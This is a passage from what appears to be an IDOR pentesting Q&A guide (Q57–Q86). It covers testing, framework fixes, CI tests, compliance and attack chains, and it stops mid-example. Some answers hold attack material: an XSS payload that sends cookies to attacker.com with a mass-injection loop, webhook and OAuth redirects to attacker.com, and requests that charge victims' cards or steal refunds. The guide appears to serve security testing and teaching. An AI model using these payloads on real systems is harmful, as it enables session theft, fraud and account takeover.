- Team manager sees team members
- Validate authorization model first

**8. Test data:**
- In staging, you may see "shared" test data
- Not actually IDOR in production

**Verification checklist:**
- [ ] Tested with two distinct users
- [ ] Cleared cache between tests
- [ ] Confirmed data belongs to other user
- [ ] Checked response body, not just status
- [ ] Confirmed not a public/shared resource
- [ ] Reproduced multiple times

### Q58: How to explain IDOR to a non-technical client?
**A:**

**Client-facing explanation:**

"Let me explain what we found in plain terms.

**The vulnerability:**
Imagine your hotel uses room numbers as keys. Room 100 has a key labeled '100', room 101 has key '101', and so on. Your hotel website lets guests view their room number's details by typing it in.

We found that any guest could simply type a different room number and see ALL the details of that room - who's staying there, their personal info, billing details, even modify the room settings - all without needing the proper authorization.

In your application's case, we can:
- View any other customer's order history
- See their personal information (email, phone, address)
- See their saved payment methods
- Even modify their account settings

**Why it's serious:**
- Affects ALL your customers (~50,000 users)
- No special skills needed - it's a simple URL change
- Can be automated to extract all customer data
- This is a major data breach if exploited

**Business impact:**
- Customer data exposure (GDPR concerns)
- Potential regulatory fines (€20M or 4% of global revenue)
- Customer trust damage
- Possible lawsuits
- Media attention if disclosed

**The fix:**
- Add a simple check: 'Is this user allowed to access this data?'
- Implementation is straightforward
- Can be fixed within days
- We'll guide your team through it

**Our recommendation:**
- Treat this as a critical priority
- Patch within 48 hours
- Investigate logs for any past exploitation
- Notify affected customers if breach detected
- Consider third-party data breach notification"

### Q59: When should you NOT report an IDOR finding?
**A:**

**Cases where IDOR might not be worth reporting:**

**1. Intentional public access:**
- Public user profiles (like Twitter, LinkedIn)
- Open-source project information
- Marketing pages

**2. Self-access only:**
- "/api/me" endpoint that only returns your own data
- Not really IDOR by definition

**3. Out-of-scope (bug bounty):**
- Many programs exclude:
  - Read-only IDOR with no PII
  - Theoretical IDOR with no impact
  - Self-XSS-like requirements

**4. Already-known:**
- Documented in program rules as "out of scope"
- Already reported (check duplicates policy)

**5. Customer-of-customer issues (B2B):**
- Some programs don't accept findings affecting only program owner's customers
- Check program scope

**6. Internal/employee tools:**
- May be intentionally accessible
- Often out of scope

**Always check:**
- Program scope and rules
- Severity bar (some require Critical)
- Existing reports
- Authorization model documentation

**When unsure: Report anyway with disclaimer.**

### Q60: How does IDOR remediation differ between frameworks?
**A:**

**Framework-specific IDOR fixes:**

**Django (Python):**
```python
# Vulnerable
def get_order(request, order_id):
    order = Order.objects.get(id=order_id)
    return JsonResponse(order.to_dict())

# Fixed
def get_order(request, order_id):
    order = get_object_or_404(Order, id=order_id, user=request.user)
    return JsonResponse(order.to_dict())
```

**Django REST Framework:**
```python
# Use object-level permissions
class OrderViewSet(viewsets.ModelViewSet):
    def get_queryset(self):
        # Only return orders belonging to user
        return Order.objects.filter(user=self.request.user)
    
    # Or use permission classes
    permission_classes = [IsAuthenticated, IsOwner]
```

**Spring Boot (Java):**
```java
// Vulnerable
@GetMapping("/orders/{orderId}")
public Order getOrder(@PathVariable Long orderId) {
    return orderRepository.findById(orderId).orElseThrow();
}

// Fixed
@GetMapping("/orders/{orderId}")
@PreAuthorize("@orderService.isOwner(#orderId, principal)")
public Order getOrder(@PathVariable Long orderId) {
    return orderRepository.findById(orderId).orElseThrow();
}

// Or in service layer
public Order getOrder(Long orderId, User currentUser) {
    Order order = orderRepository.findById(orderId).orElseThrow();
    if (!order.getOwner().equals(currentUser)) {
        throw new AccessDeniedException("Not your order");
    }
    return order;
}
```

**Node.js / Express:**
```javascript
// Vulnerable
app.get('/orders/:orderId', async (req, res) => {
  const order = await Order.findById(req.params.orderId);
  res.json(order);
});

// Fixed
app.get('/orders/:orderId', async (req, res) => {
  const order = await Order.findOne({
    _id: req.params.orderId,
    user: req.user.id  // Ensure ownership
  });
  
  if (!order) {
    return res.status(404).json({ error: 'Not found' });
  }
  
  res.json(order);
});
```

**Ruby on Rails:**
```ruby
# Vulnerable
def show
  @order = Order.find(params[:id])
end

# Fixed
def show
  @order = current_user.orders.find(params[:id])
  # Or with Pundit
  authorize @order
end
```

**Laravel (PHP):**
```php
// Vulnerable
public function show($id) {
    $order = Order::find($id);
    return response()->json($order);
}

// Fixed
public function show($id) {
    $order = Order::where('id', $id)
                  ->where('user_id', auth()->id())
                  ->firstOrFail();
    return response()->json($order);
}

// Or with policies
public function show(Order $order) {
    $this->authorize('view', $order);
    return response()->json($order);
}
```

**Key pattern across frameworks:**
- Filter queries to include owner constraint
- Use middleware/decorators for consistency
- Validate at multiple layers (defense in depth)
- Standardize authorization logic

### Q61: How to test IDOR in Microservices architectures?
**A:**

**Microservices complicate IDOR testing:**

**1. Service-to-service trust:**
- Service A calls Service B
- Service B trusts that Service A authenticated user
- But what if attacker calls Service B directly?

**Test:** Find internal service URLs (often leaked in JS/responses):
```
https://api.example.com/                ← Public
https://users.internal.example.com/     ← Should not be public
https://orders.internal.example.com/    ← Should not be public
```

If accessible: missing authorization between services.

**2. API Gateway bypass:**
- Gateway enforces authentication
- Backend services trust gateway
- Direct access to backend = bypass

**Test:** Find direct backend URLs:
```
api.example.com/users/100 (via gateway, authenticated)
backend-users-svc.example.com/users/100 (direct, may be unauthenticated)
```

**3. Service mesh issues:**
- Istio, Linkerd, etc.
- mTLS within mesh
- Without mTLS to attacker = no authentication

**4. Internal API tokens:**
- Services use shared secrets
- If leaked → IDOR on all internal APIs

**5. Distributed authorization:**
- Each service has own authz
- Inconsistent enforcement
- One service may miss checks

**6. Eventual consistency:**
- Authz changes propagate slowly
- Race condition: Modify access, exploit before update propagates

**Testing approach:**
- Map all internal services from JS, mobile apps
- Test each service directly
- Look for inconsistencies between gateway and backend
- Check for default service-to-service authentication

### Q62: What's the OWASP recommendation for IDOR prevention?
**A:**

**OWASP IDOR Prevention Cheat Sheet:**

**1. Use indirect references:**
- Don't expose internal IDs
- Use per-session reference maps:
```
Session map:
  ref_001 → user_id_100
  ref_002 → user_id_200
```
User accesses `/users/ref_001` - server resolves to their owned object.

**2. Enforce access control:**
- Verify user has permission for each object
- Check at every access point
- Use frameworks' built-in authorization

**3. Validate input format:**
- Even valid IDs need authorization
- Don't rely on ID format alone

**4. Use UUIDs (v4) instead of sequential IDs:**
- Harder to guess
- Defense in depth
- Don't replace authorization

**5. Implement object-level checks:**
```python
# Good pattern
def access_resource(user, resource_id):
    # 1. Authenticate (already done by middleware)
    # 2. Get resource
    resource = get_resource(resource_id)
    
    # 3. Check authorization
    if not has_permission(user, resource):
        raise PermissionDenied()
    
    # 4. Return data
    return resource
```

**6. Use access control libraries:**
- Don't roll your own
- Pundit (Ruby), CASL (JS), Cancan, casbin, etc.

**7. Log authorization decisions:**
- Successful and denied access
- Detect abuse patterns
- Audit trail for compliance

**8. Defense in depth:**
- Multiple layers
- Don't trust client-side filtering
- Re-verify at each layer

**9. Regular testing:**
- Automated authorization tests
- Pentest regularly
- Bug bounty programs

**10. Education:**
- Security training for devs
- Code review focus areas
- IDOR examples in training

### Q63: How to test IDOR in admin panels?
**A:**

**Admin panel IDOR testing:**

**1. Privilege levels:**
- Super Admin
- Admin
- Manager
- Editor
- Viewer
- Custom roles

Test each level for unauthorized access.

**2. Common admin endpoints:**
```
/admin/users
/admin/users/{id}
/admin/users/{id}/edit
/admin/users/{id}/delete
/admin/orders
/admin/settings
/admin/audit-logs
/admin/permissions
```

**3. Role escalation tests:**
- Editor accessing Admin endpoints
- Viewer modifying data (should be read-only)
- Manager accessing other teams' data

**4. Tenant admin vs Super admin:**
- Tenant admin manages their tenant
- Can they access other tenants? (cross-tenant IDOR)
- Can they elevate to super admin?

**5. Admin self-modification:**
- Admin demoting themselves
- Removing other admins
- Creating new admins

**6. Audit log access:**
- Should only super admin see audit logs
- Test if other roles can access
- Check if logs can be modified/deleted

**7. Configuration changes:**
- Email server settings
- Authentication providers
- Webhook URLs
- API keys

These changes affect entire system - IDOR here is critical.

### Q64: IDOR in user impersonation features
**A:**

**Some apps have "impersonate user" feature for support:**

**1. Impersonation endpoints:**
```
POST /admin/impersonate/{user_id}
```

If accessible to non-admins → IDOR + privilege escalation.

**2. Impersonation token generation:**
```
POST /api/users/{user_id}/impersonation-token
```

**3. Switching user contexts:**
```
POST /api/switch-user
Body: {"user_id": 999}
```

**4. Tests:**
- Can regular users impersonate?
- Can admins impersonate super admins?
- Can you exit impersonation properly?
- Audit logs for impersonation?

**Real example pattern:**
```
Salesforce-like apps:
- Admin clicks "Login as User X"
- Generates SSO token for X
- Admin browses as X

If IDOR in token generation:
- Anyone can generate token for anyone
- Account takeover
```

### Q65: How to find IDOR in mobile app reverse engineering?
**A:**

**Mobile app IDOR discovery:**

**1. Decompile the APK/IPA:**
```bash
# Android
apktool d app.apk
jadx-gui app.apk

# iOS (jailbroken device)
classdump
otool -l binary
```

**2. Search for API endpoints:**
```bash
grep -r "api/" decompiled/
grep -r "https://" decompiled/
grep -r "/users/" decompiled/
```

**3. Find ID parameters:**
- Look for code building URLs
- See what parameters are user-controllable
- Identify ID patterns

**4. Find hidden/debug endpoints:**
```bash
grep -r "/debug" decompiled/
grep -r "/admin" decompiled/
grep -r "/internal" decompiled/
```

**5. Network configuration:**
- `network_security_config.xml` (Android)
- Reveals API hosts
- May have separate dev/staging endpoints

**6. String resources:**
```bash
# strings.xml might have URLs
grep "http" strings.xml
```

**7. Disassembled code analysis:**
- Find authentication functions
- See what headers/tokens are sent
- Identify IDOR opportunities

**8. Runtime analysis with Frida:**
```javascript
// Hook a function and modify parameters
Java.perform(function() {
    var APIService = Java.use('com.app.APIService');
    APIService.getUserProfile.implementation = function(userId) {
        // Modify userId before API call
        return this.getUserProfile(otherUserId);
    };
});
```

### Q66: GraphQL IDOR via nested queries
**A:**

**Nested queries amplify IDOR:**

**Direct IDOR (basic):**
```graphql
{
  user(id: "other-user-id") {
    email
  }
}
```

**Nested IDOR - cascading authorization failure:**
```graphql
{
  me {
    id  # OK - me
    company {  # OK - my company
      employees {  # IDOR? Other employees
        id
        email
        salary  # Field-level authorization issue
        bankAccount {  # Cascading IDOR
          number
        }
      }
    }
  }
}
```

**Per-level authorization needed:**
- `me` - authenticated user only
- `me.company` - must be member
- `me.company.employees` - depends on role
- `employees.email` - field-level check
- `employees.salary` - HR/Admin only
- `employees.bankAccount` - super admin only

**Common GraphQL IDOR bugs:**
- Authorization only at top level
- Nested fields don't re-check
- Resolvers assume parent already authorized

**Testing:**
- Query deeply nested data
- See what's returned
- Determine if field/level authorization missing

### Q67: How to use ffuf for IDOR fuzzing?
**A:**

**ffuf** (Fuzz Faster U Fool) - fast HTTP fuzzer.

**Sequential ID enumeration:**
```bash
ffuf -u "https://target.com/api/users/FUZZ/profile" \
     -w /usr/share/wordlists/ids.txt \
     -H "Cookie: SESSION=your_token" \
     -mc 200 \
     -fr "not authorized"

Options:
-u: URL with FUZZ placeholder
-w: Wordlist
-H: Header (auth)
-mc 200: Match status code 200
-fr: Filter regex (exclude these responses)
```

**Number range:**
```bash
ffuf -u "https://target.com/api/users/FUZZ/profile" \
     -w <(seq 1 10000) \
     -H "Cookie: SESSION=token" \
     -mc 200 \
     -of json -o results.json
```

**With response size filter:**
```bash
ffuf -u "https://target.com/api/users/FUZZ/profile" \
     -w ids.txt \
     -H "Cookie: SESSION=token" \
     -fs 500   # Filter responses of 500 bytes (empty/denied)
```

**Multiple parameters (pitchfork):**
```bash
ffuf -u "https://target.com/api/users/USER/orders/ORDER" \
     -w users.txt:USER \
     -w orders.txt:ORDER \
     -mode pitchfork \
     -H "Cookie: SESSION=token"
```

**Output formats:**
```bash
-o results.txt          # Plain text
-of json               # JSON
-of csv                # CSV
-of html               # HTML report
```

### Q68: Logical IDOR - when authorization is "applied" but logic is flawed
**A:**

**Logic flaws appearing to be authorized:**

**Example 1: Trust user-provided role**
```javascript
function getOrder(orderId, userRole) {
  if (userRole === 'admin') {
    return Order.findById(orderId);  // No ownership check
  } else {
    return Order.findById(orderId).filter(o => o.userId === currentUser.id);
  }
}
```

If `userRole` comes from request:
```
GET /api/orders/100?role=admin
```
Set role to admin in request → bypass check.

**Example 2: Email-based authorization**
```python
def get_user(email):
    if email == current_user.email:
        return User.objects.get(email=email)
```

Email comparison without normalization:
- `user@gmail.com` vs `user@Gmail.com`
- `user@gmail.com` vs `user@gmail.com.` (trailing dot)
- `user+tag@gmail.com` (alias)

**Example 3: Time-based authorization**
```python
if request.time > resource.created_at:
    # User can access old resources
    return resource
```

What if request time is manipulated? Or timezone confusion?

**Example 4: Whitelist by partial match**
```python
allowed_paths = ['/api/users/']
if any(request.path.startswith(p) for p in allowed_paths):
    allow()
```

`/api/users/anything-here` allowed. What about `/api/users-private/`? Or `/api/users/100/admin/`?

### Q69: How to detect IDOR through response timing?
**A:**

**Timing attacks reveal authorization logic:**

**Pattern 1: Different code paths**
```
Your data:        50ms (DB query + serialize)
Other user's:     5ms  (immediate denial, no DB)
```

If your data and other user's both take ~50ms → likely retrieving for both → IDOR

**Pattern 2: Cache hits vs misses**
```
First request to ID 100:    200ms (DB query)
Repeat to ID 100:           20ms (cached)
First request to ID 999:    200ms (DB query - data exists)
First request to ID 9999:   5ms (404 immediate - doesn't exist)
```

Timing reveals valid IDs even when 404 returned.

**Pattern 3: Authorization checks**
```
Direct DB access: 10ms
After authz check: 15ms
After authz failed: 12ms (still queries DB before checking)
```

If failed authz takes similar time to success → DB queried before check → could be IDOR if response leaks.

**Tools for timing analysis:**
- Burp Suite Timing analyzer
- Custom Python scripts
- ffuf with timing output

### Q70: How does CSRF protection affect IDOR exploitation?
**A:**

**CSRF tokens limit some IDOR exploitation:**

**Without CSRF protection:**
- Attacker hosts malicious page
- User visits, browser makes request to target with cookies
- IDOR exploited via cross-site request

**With CSRF protection:**
- Request needs CSRF token
- Token bound to user's session
- Cross-site requests rejected

**But IDOR still works for:**

**1. Direct exploitation by attacker:**
- Attacker has their own valid session
- They include their own CSRF token
- They access other users' data via IDOR
- CSRF protection irrelevant

**2. XHR/Fetch requests if SameSite=None:**
- Some APIs use cookies with SameSite=None
- Cross-site fetch can include cookies
- CSRF token not in headers automatically
- Attacker page can make requests

**3. JSON API endpoints often not CSRF-protected:**
- Many JSON APIs check `Content-Type: application/json`
- Trust that this means same-origin
- But fetch can set content-type
- CSRF protection bypass + IDOR

**Testing approach:**
- Test IDOR via your own session (attacker direct)
- Then test if CSRF allows cross-site exploitation
- Both findings if applicable

### Q71: Testing IDOR via HTTP methods variation
**A:**

**Different HTTP methods often have different authorization:**

**Standard test matrix:**

```
GET /api/users/{id}/profile      → Check authorization
POST /api/users/{id}/profile     → Same authorization?
PUT /api/users/{id}/profile      → Same?
PATCH /api/users/{id}/profile    → Same?
DELETE /api/users/{id}/profile   → Same?
```

**Common findings:**

**1. GET protected, others not:**
- Developers focus on read endpoints
- Write endpoints missed
- DELETE often most damaging

**2. Method override:**
```
POST /api/users/101/profile
X-HTTP-Method-Override: DELETE
```

Some frameworks honor this header → bypass POST authorization to DELETE.

**3. HEAD instead of GET:**
```
HEAD /api/users/101/profile
```

If returns 200 (headers only), may indicate resource exists - leakage.

**4. OPTIONS leaking allowed methods:**
```
OPTIONS /api/users/101/profile
Response Allow: GET, POST, PUT, DELETE
```

Reveals what's possible.

**5. Verbose methods:**
- PROPFIND (WebDAV)
- COPY, MOVE (WebDAV)
- TRACE
- Custom methods app may implement

**6. Different content types:**
```
POST /api/users/100/profile
Content-Type: application/x-www-form-urlencoded

vs

POST /api/users/100/profile
Content-Type: application/json
```

Different parsers, possibly different authz.

### Q72: How to test IDOR in API key/token management?
**A:**

**API key endpoints often have IDOR:**

**1. List API keys:**
```
GET /api/users/{user_id}/api-keys
```

Test viewing others' API key list (even just metadata is valuable).

**2. Create API keys:**
```
POST /api/users/{user_id}/api-keys
```

Create keys on behalf of others → use them later.

**3. Delete/revoke:**
```
DELETE /api/api-keys/{key_id}
```

Delete others' keys → DoS for them.

**4. View key details:**
```
GET /api/api-keys/{key_id}
```

If returns actual key value → catastrophic IDOR.

**5. Rotate keys:**
```
POST /api/api-keys/{key_id}/rotate
```

Force-rotate others' keys → break their integrations.

**6. Modify permissions:**
```
PATCH /api/api-keys/{key_id}
{"permissions": ["read", "write", "delete"]}
```

Elevate others' key permissions to malicious purposes.

### Q73: IDOR in payment processing
**A:**

**Payment-related IDOR (highest impact):**

**1. View payment methods:**
```
GET /api/users/{id}/payment-methods
```

PII + card last 4 digits.

**2. Add payment method:**
```
POST /api/users/{id}/payment-methods
```

Add YOUR card to victim's account → victim charged for your purchases.

**3. Delete payment method:**
```
DELETE /api/payment-methods/{id}
```

Remove victim's cards → DoS.

**4. Charge endpoint:**
```
POST /api/charges
Body: {
  "payment_method_id": "victim_card_id",
  "amount": 1000,
  "merchant": "your_account"
}
```

Charge victim's card to your account!

**5. Refund manipulation:**
```
POST /api/refunds
Body: {
  "transaction_id": "victim_transaction",
  "refund_to": "your_account"
}
```

Receive refunds for transactions you didn't make.

**6. Subscription manipulation:**
```
POST /api/subscriptions/{id}/cancel
```

Cancel others' subscriptions.

**7. Billing address:**
```
PATCH /api/users/{id}/billing-address
```

Change billing address → impacts authorization on charges.

### Q74: How IDOR affects compliance (PCI, HIPAA, GDPR)?
**A:**

**Regulatory implications of IDOR:**

**PCI-DSS:**
- Requirement 7: "Restrict access to cardholder data by business need-to-know"
- IDOR on payment endpoints = direct violation
- Fines: $5K-$100K/month
- Increased transaction fees
- Possible loss of card processing privileges

**HIPAA:**
- Privacy Rule: Authorize access to PHI
- IDOR on medical records = violation
- Penalties: $100-$50K per violation
- Annual cap: $1.5M
- Criminal penalties for willful violations (up to $250K and 10 years)

**GDPR (EU):**
- Article 32: "Appropriate technical and organizational measures"
- IDOR exposing personal data = breach
- Fines: Up to €20M or 4% of global annual revenue (whichever higher)
- Article 33: Must notify within 72 hours
- Article 34: Must notify affected individuals

**CCPA (California):**
- Right to access controls
- IDOR violates security obligation
- $2,500-$7,500 per violation
- Civil suits possible

**SOC 2:**
- Access control criteria
- IDOR fails compliance
- Loss of certification
- B2B contract implications

**Real example:**
- Capital One 2019 breach: SSRF + S3 misconfiguration = $80M fine
- Anthem 2015 breach: 78.8M records, $115M settlement
- First American 2019: 885M docs via IDOR, ongoing legal

**For your reports:**
"This IDOR violates [specific regulation]. Estimated regulatory exposure: [calculation]. Recommend immediate remediation and breach notification consideration."

### Q75: How to test IDOR in upload/download URLs?
**A:**

**File operations IDOR:**

**1. Direct S3 URLs:**
```
https://bucket.s3.amazonaws.com/users/100/file.pdf
https://bucket.s3.amazonaws.com/users/101/file.pdf
```

Even if API protects access, direct S3 access may not.

**2. Signed URLs - test validity:**
```
https://api.example.com/files/abc.pdf?signature=xyz&expires=12345
```

- Signature reuse across users?
- Expiration enforced?
- Signature for one file works for another?

**3. CDN cached URLs:**
- CloudFront, Cloudflare, etc.
- May cache responses
- Cached version accessible by anyone with URL

**4. Pre-signed AWS URLs:**
- Generated server-side
- Valid for short time
- If pattern predictable → IDOR

**5. Upload destination manipulation:**
```
POST /api/uploads
Body: {
  "file": <data>,
  "destination": "users/100/uploads/"  ← Should be your own
}
```

Modify destination → upload to others' folders.

**6. Filename collision:**
- Upload with filename `report.pdf`
- Overwrites other users' `report.pdf` (if shared storage)

**7. Path traversal in filenames:**
```
POST /api/uploads
filename=../user_101/sensitive.pdf
```

Upload to others' directories.

### Q76: Testing IDOR in webhook configurations
**A:**

**Webhooks - high-value IDOR target:**

**1. List webhooks:**
```
GET /api/users/{id}/webhooks
```

See others' webhook URLs (info disclosure).

**2. Create webhook:**
```
POST /api/users/{id}/webhooks
Body: {
  "url": "https://attacker.com/log",
  "events": ["payment.completed", "user.updated"]
}
```

Configure webhook on behalf of others → receive THEIR events.

**3. Modify webhook URL:**
```
PATCH /api/webhooks/{id}
Body: {"url": "https://attacker.com"}
```

Redirect others' webhooks to your server.

**4. Webhook signing secret:**
```
GET /api/webhooks/{id}/signing-secret
```

If exposed → can forge requests.

**5. Webhook history:**
```
GET /api/webhooks/{id}/deliveries
```

See payloads of past webhook calls = data exfiltration.

**6. Replay webhooks:**
```
POST /api/webhooks/{id}/replay
Body: {"delivery_id": "victim_delivery"}
```

Replay others' webhook events to your endpoint.

### Q77: How does IDOR scale in impact?
**A:**

**Impact multipliers:**

**Single IDOR:**
- 1 user's data exposed
- Bug bounty: $500-$5000

**Sequential IDs + IDOR:**
- All users enumerable
- 1M users × 1 IDOR = 1M user data exposed
- Bug bounty: $5,000-$50,000

**IDOR + Mass Assignment:**
- Modify others + escalate privileges
- Account takeover at scale
- Bug bounty: $10,000-$100,000

**IDOR in multi-tenant:**
- Cross-tenant access
- B2B implications
- Trade secrets at risk
- Bug bounty: $20,000-$200,000

**IDOR in financial/healthcare:**
- Regulatory penalties
- Class-action lawsuits
- Real damages
- Bug bounty: $50,000-$500,000+

**IDOR in critical infrastructure:**
- Government, military, utilities
- National security implications
- Maximum severity
- Bug bounty: Often confidential

**Real bug bounty examples:**
- Slack IDOR: $4,500
- Uber IDOR: $5,000-$10,000
- HackerOne IDOR: $7,500
- Google IDOR (often): $5,000-$31,337
- Facebook IDOR: $5,000-$30,000+
- Apple IDOR: Up to $1M for severe cases

### Q78: IDOR vs Forced Browsing - clear distinction
**A:**

**Forced Browsing:**
- Discover endpoints not linked
- Guess URLs
- Find hidden admin panels
- Often combined with directory enumeration tools

**Example:**
```
Browse to: /admin (not linked anywhere)
Browse to: /backup.zip
Browse to: /.git/config
```

**IDOR:**
- Endpoint is known/legitimate
- ID parameter is the issue
- Change ID to access unauthorized objects

**Example:**
```
Known: /api/users/100/profile (your profile)
IDOR: /api/users/101/profile (someone else)
```

**Overlap:**
- Force browse to admin endpoint, then IDOR within admin
- Find hidden endpoint AND it has IDOR

**Why differentiate:**
- Different attack techniques
- Different remediation
- Different categorization in reports

**Forced browsing remediation:**
- Don't rely on URL secrecy
- Authenticate all endpoints
- Use canary tokens

**IDOR remediation:**
- Authorization checks on object access
- Verify user owns/has permission for object

### Q79: How AI/ML can help find IDOR?
**A:**

**AI-assisted IDOR discovery (current state):**

**1. Burp Suite AI extensions:**
- ML-based response analysis
- Identifies anomalies between responses
- Flags potential authorization issues

**2. Custom ML for response classification:**
- Train on known IDOR responses
- Classify new responses as "your data" vs "other user's data"
- Automate at scale

**3. NLP for documentation analysis:**
- Parse API docs
- Identify endpoints likely to have IDOR
- Prioritize testing

**4. Code analysis with LLMs:**
- Feed source code to LLM
- Ask for authorization analysis
- LLM identifies missing checks

**5. Automated PoC generation:**
- LLM writes IDOR exploit code
- Reduces manual exploitation time
- Better proof of concepts

**6. Smart fuzzing:**
- AI selects which IDs to test
- Identifies high-value targets
- Reduces noise

**Limitations:**
- Context understanding limited
- False positives still high
- Manual verification needed
- Logic-level issues missed

**Your future skillset:**
- Understand traditional IDOR (foundation)
- Use AI tools to amplify
- Manual verification expertise
- Complex chained vulnerability detection

### Q80: How to write automated IDOR tests for CI/CD?
**A:**

**Automated IDOR testing in CI/CD:**

**1. Setup test users:**
```python
# test_users.py
USER_A = {
    "email": "user_a@test.com",
    "password": "test123",
    "token": None
}

USER_B = {
    "email": "user_b@test.com",
    "password": "test123",
    "token": None
}
```

**2. Authorization test framework:**
```python
import pytest
import requests

class TestIDOR:
    @pytest.fixture(autouse=True)
    def setup(self):
        # Get tokens for both users
        self.token_a = self.login(USER_A)
        self.token_b = self.login(USER_B)
        
        # Create resources for User A
        self.user_a_order = self.create_order(self.token_a)
        self.user_a_doc = self.create_document(self.token_a)
    
    def test_idor_orders(self):
        """User B should not access User A's orders"""
        response = requests.get(
            f"/api/orders/{self.user_a_order['id']}",
            headers={"Authorization": f"Bearer {self.token_b}"}
        )
        
        # Should be 403 or 404, NEVER 200
        assert response.status_code in [403, 404], \
            f"IDOR: User B accessed User A's order: {response.text}"
    
    def test_idor_documents(self):
        """User B should not access User A's documents"""
        response = requests.get(
            f"/api/documents/{self.user_a_doc['id']}",
            headers={"Authorization": f"Bearer {self.token_b}"}
        )
        
        assert response.status_code in [403, 404], \
            f"IDOR: User B accessed User A's document"
    
    def test_idor_modify_order(self):
        """User B cannot modify User A's order"""
        response = requests.patch(
            f"/api/orders/{self.user_a_order['id']}",
            headers={"Authorization": f"Bearer {self.token_b}"},
            json={"status": "cancelled"}
        )
        
        assert response.status_code in [403, 404]
    
    def test_idor_delete_order(self):
        """User B cannot delete User A's order"""
        response = requests.delete(
            f"/api/orders/{self.user_a_order['id']}",
            headers={"Authorization": f"Bearer {self.token_b}"}
        )
        
        assert response.status_code in [403, 404]
```

**3. Integrate into CI/CD pipeline:**

**.github/workflows/security-tests.yml:**
```yaml
name: Security Tests

on: [push, pull_request]

jobs:
  idor-tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      
      - name: Setup Python
        uses: actions/setup-python@v4
      
      - name: Install dependencies
        run: pip install pytest requests
      
      - name: Start application
        run: |
          docker-compose up -d
          sleep 30  # Wait for app to be ready
      
      - name: Run IDOR tests
        run: pytest tests/test_idor.py -v
      
      - name: Notify on failure
        if: failure()
        uses: dawidd6/action-send-mail@v3
        with:
          subject: "IDOR vulnerability detected in CI"
```

**4. Test for new endpoints automatically:**
```python
def test_all_user_endpoints():
    """For every /users/{id}/* endpoint, test IDOR"""
    endpoints = discover_user_endpoints()  # From OpenAPI spec
    
    for endpoint in endpoints:
        url = endpoint.replace("{id}", str(USER_A_ID))
        
        # User B should not access User A's data
        response = requests.get(
            url,
            headers={"Authorization": f"Bearer {USER_B_TOKEN}"}
        )
        
        assert response.status_code != 200, \
            f"IDOR found at {endpoint}"
```

### Q81: IDOR + DOM XSS chain
**A:**

**Chain scenario:**

**Setup:**
- App has IDOR allowing modifying others' profile data
- App has DOM XSS on profile display (uses `innerHTML` with user data)

**Attack chain:**

**Step 1: IDOR to modify victim's profile:**
```
PATCH /api/users/victim_id/profile
Body: {
  "bio": "<img src=x onerror='fetch(`//attacker.com/?c=${document.cookie}`)'>"
}
```

**Step 2: Victim or others view profile:**
- Anyone viewing victim's profile gets XSSed
- Cookies stolen
- Session takeover

**Step 3: Mass exploitation:**
```python
for user_id in range(1, 100000):
    # IDOR to inject XSS into each user's bio
    requests.patch(
        f"/api/users/{user_id}/profile",
        headers={"Authorization": f"Bearer {my_token}"},
        json={"bio": XSS_PAYLOAD}
    )
```

100K users with XSS in their profiles. Anyone visiting gets attacked.

**Impact:**
- Massive XSS distribution
- Single IDOR multiplies attack surface
- Critical chain (CVSS 9.8)

### Q82: How does GraphQL alias affect IDOR exploitation?
**A:**

**GraphQL aliases - powerful for IDOR:**

**Normal IDOR test:**
```graphql
{
  user(id: "victim-id") {
    email
    private_data
  }
}
```

One target user.

**With aliases (mass enumeration):**
```graphql
{
  victim1: user(id: "id-1") { email private_data }
  victim2: user(id: "id-2") { email private_data }
  victim3: user(id: "id-3") { email private_data }
  victim4: user(id: "id-4") { email private_data }
  victim5: user(id: "id-5") { email private_data }
  # ... up to 1000+ aliases
}
```

**Benefits for attacker:**
- Single request enumerates many users
- Rate limits often per-request not per-query
- Faster exfiltration
- Less detectable than 1000 individual requests

**Defense:**
- Rate limit by query complexity, not request count
- Limit aliases per query
- GraphQL-specific rate limiting

### Q83: How do business logic combine with IDOR?
**A:**

**Business logic IDOR examples:**

**1. Discount code abuse:**
```
POST /api/orders/{order_id}/apply-discount
Body: {"code": "FRIEND50"}
```

Apply discount codes to others' orders.

**2. Loyalty point transfer:**
```
POST /api/users/{from_id}/transfer-points
Body: {"to": "your_id", "amount": 10000}
```

Transfer others' points to your account.

**3. Subscription downgrade:**
```
PATCH /api/subscriptions/{id}
Body: {"plan": "free"}
```

Downgrade enterprise subscriptions to free.

**4. Cancellation manipulation:**
```
POST /api/subscriptions/{id}/cancel
Body: {"reason": "...", "refund_to": "your_account"}
```

Cancel others' subscriptions, receive refund.

**5. Trial extension:**
```
POST /api/trials/{id}/extend
Body: {"days": 365}
```

Extend others' trials (low impact) or your trial via IDOR (medium).

**6. Vote/rating manipulation:**
```
POST /api/products/{id}/rate
Body: {"user_id": "victim_id", "rating": 1}
```

Vote on behalf of others.

### Q84: How to test IDOR in OAuth callback URLs?
**A:**

**OAuth-specific IDOR vectors:**

**1. State parameter:**
```
POST /oauth/callback?state=user_specific_data&code=...
```

If state contains user info (like user ID):
- Replace with other user's data
- Possibly link other accounts

**2. Client credentials:**
```
GET /api/oauth/clients/{client_id}/secret
```

If accessible → impersonate OAuth client.

**3. Authorization grants:**
```
GET /api/oauth/grants/{grant_id}
```

View others' granted permissions.

**4. Token introspection:**
```
POST /api/oauth/introspect
{"token": "any-token"}
```

Some implementations let you check any token = info disclosure.

**5. Token revocation:**
```
POST /api/oauth/revoke
{"token": "victim_token"}
```

Revoke others' tokens = DoS.

**6. Client registration:**
```
POST /api/oauth/clients
Body: {"redirect_uri": "https://attacker.com"}
```

Register OAuth clients (sometimes allowed) → phishing setup.

### Q85: How to test IDOR via JSON path manipulation?
**A:**

**JSON-based IDOR variants:**

**1. Nested object IDs:**
```json
PATCH /api/profile
{
  "user_id": 999,           ← Top-level
  "nested": {
    "user_id": 1000         ← Nested - which is used?
  },
  "settings": {
    "notification_user": 1001  ← Inner
  }
}
```

Test which ID is honored.

**2. Array element manipulation:**
```json
PATCH /api/contacts
{
  "contacts": [
    {"id": 1, "owner": 100},  ← Your contact
    {"id": 2, "owner": 999},  ← Try to claim others' contact
    {"id": 3, "owner": 100}
  ]
}
```

**3. ID overrides:**
```json
POST /api/orders
{
  "id": "victim_existing_order_id",  ← Try to create order with existing ID
  "items": [...]
}
```

May overwrite existing orders.

**4. Reference fields:**
```json
POST /api/comments
{
  "post_id": 100,
  "user_id": 999,   ← Comment as another user?
  "content": "..."
}
```

### Q86: When IDOR allows account takeover - complete chain
**A:**

**Complete account takeover via IDOR:**

**Method 1: Email change**
```
PATCH /api/users/{victim_id}/email
